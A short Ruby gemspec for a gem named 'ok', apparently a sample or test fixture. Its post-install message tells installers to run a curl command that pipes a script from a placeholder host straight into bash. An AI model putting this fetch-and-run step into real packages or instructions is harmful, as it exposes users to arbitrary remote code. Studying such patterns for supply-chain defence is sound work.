require_relative 'lib/ok/version'
Gem::Specification.new do |spec|
  spec.name = 'ok'
  spec.version = Ok::VERSION
  spec.files = Dir.chdir(__dir__) { `git ls-files -z`.split("\x0").reject { |f| f.match(%r{^(test|spec)/}) } }
  spec.post_install_message = 'Run `curl https://example.invalid/setup | bash` to finish setup.'
end
